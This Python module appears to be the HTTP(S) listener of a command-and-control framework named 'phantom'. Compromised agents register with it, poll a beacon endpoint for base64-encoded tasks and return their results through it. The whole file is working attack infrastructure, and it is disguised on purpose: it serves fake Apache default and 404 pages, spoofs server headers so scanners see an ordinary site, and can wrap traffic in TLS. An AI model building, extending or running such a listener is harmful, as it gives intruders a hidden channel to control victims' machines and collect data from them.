"""HTTP(S) listener — serves agent communication over HTTP."""

import base64
import json
import logging
import ssl
import threading
import time
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler

log = logging.getLogger("phantom.c2.http")

# Fake HTML returned for unrecognised paths so port scanners see a normal site
_FAKE_404 = b"""<!DOCTYPE html>
<html><head><title>404 Not Found</title></head>
<body><h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr><address>Apache/2.4.59 (Ubuntu) Server</address>
</body></html>"""

_FAKE_INDEX = b"""<!DOCTYPE html>
<html><head><title>Welcome</title></head>
<body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
</body></html>"""


class _HttpHandler(BaseHTTPRequestHandler):
    """Request handler for agent HTTP traffic."""

    server_version = "Apache/2.4.59"
    sys_version = ""

    def log_message(self, fmt, *args):
        log.debug(f"{self.client_address[0]} - {fmt % args}")

    def _read_json_body(self) -> dict | None:
        length = int(self.headers.get("Content-Length", 0))
        if length <= 0:
            return None
        try:
            return json.loads(self.rfile.read(length))
        except (json.JSONDecodeError, ValueError):
            return None

    def _send_json(self, data: dict, code: int = 200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, body: bytes, code: int = 200):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server", "Apache/2.4.59 (Ubuntu)")
        self.end_headers()
        self.wfile.write(body)

    def _strip_path(self) -> str:
        return self.path.split("?")[0].rstrip("/")

    # ---- GET handlers ----

    def do_GET(self):
        path = self._strip_path()

        # Beacon endpoint: agent polls for pending tasks
        if path.startswith("/api/v1/beacon/"):
            session_id = path.split("/api/v1/beacon/")[-1]
            self._handle_beacon(session_id)
            return

        # Any other GET returns a realistic fake page
        if path in ("", "/", "/index.html"):
            self._send_html(_FAKE_INDEX)
        else:
            self._send_html(_FAKE_404, code=404)

    # ---- POST handlers ----

    def do_POST(self):
        path = self._strip_path()

        if path == "/api/v1/register":
            self._handle_register()
            return

        if path == "/api/v1/response":
            self._handle_response()
            return

        self._send_html(_FAKE_404, code=404)

    # ---- DELETE handler (disconnect) ----

    def do_DELETE(self):
        path = self._strip_path()
        if path == "/api/v1/register":
            body = self._read_json_body()
            session_id = body.get("id") if body else None
            if session_id and self.server.session_manager:
                self.server.session_manager.mark_dead(session_id)
                log.info(f"[*] Agent disconnected via HTTP: {session_id}")
            self._send_json({"status": "ok"})
            return
        self._send_html(_FAKE_404, code=404)

    # ---- Core logic ----

    def _handle_register(self):
        body = self._read_json_body()
        if not body:
            self._send_json({"error": "bad request"}, code=400)
            return

        session_id = body.get("id")
        raw_data = body.get("data", "")
        try:
            payload_bytes = base64.b64decode(raw_data)
            payload = json.loads(payload_bytes) if payload_bytes != b"register" else {}
        except (ValueError, json.JSONDecodeError):
            payload = {}

        if not session_id:
            session_id = f"sess-{uuid.uuid4().hex[:8]}"

        agent_id = payload.get("agent_id", body.get("agent_id", "http-agent"))
        addr = self.client_address

        if self.server.session_manager:
            self.server.session_manager.register(
                session_id=session_id,
                agent_id=agent_id,
                addr=addr,
                info=payload,
            )

        log.info(f"[+] Agent registered via HTTP: {agent_id} -> {session_id}")
        self._send_json({
            "status": "accepted",
            "session_id": session_id,
        })

    def _handle_beacon(self, session_id: str):
        sm = self.server.session_manager
        if not sm:
            self._send_json({})
            return

        sm.update_beacon(session_id, {})
        task = sm.get_pending_task(session_id)
        if task:
            encoded = base64.b64encode(json.dumps(task).encode()).decode()
            self._send_json({"data": encoded})
        else:
            self._send_json({})

    def _handle_response(self):
        body = self._read_json_body()
        if not body:
            self._send_json({"error": "bad request"}, code=400)
            return

        session_id = body.get("id")
        raw_data = body.get("data", "")
        try:
            payload = json.loads(base64.b64decode(raw_data))
        except (ValueError, json.JSONDecodeError):
            payload = {}

        if session_id and self.server.session_manager:
            self.server.session_manager.store_response(session_id, payload)

        self._send_json({"status": "ok"})


class _PhantomHTTPServer(HTTPServer):
    """HTTPServer subclass that carries a reference to the session manager."""

    def __init__(self, server_address, handler_class, session_manager=None):
        self.session_manager = session_manager
        super().__init__(server_address, handler_class)


class HttpListener:
    """HTTP(S) listener for agent communication."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8443,
                 session_manager=None, use_tls: bool = False,
                 certfile: str | None = None, keyfile: str | None = None):
        self.host = host
        self.port = port
        self.session_manager = session_manager
        self.use_tls = use_tls
        self.certfile = certfile
        self.keyfile = keyfile
        self._server: _PhantomHTTPServer | None = None
        self._thread: threading.Thread | None = None
        self._running = False

    def start(self):
        self._server = _PhantomHTTPServer(
            (self.host, self.port), _HttpHandler,
            session_manager=self.session_manager,
        )
        if self.use_tls and self.certfile:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
            self._server.socket = ctx.wrap_socket(
                self._server.socket, server_side=True,
            )
        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()
        proto = "HTTPS" if self.use_tls else "HTTP"
        log.info(f"[+] {proto} listener started on {self.host}:{self.port}")

    def _serve(self):
        while self._running:
            self._server.handle_request()

    def stop(self):
        self._running = False
        if self._server:
            self._server.shutdown()
        log.info("[*] HTTP listener stopped")
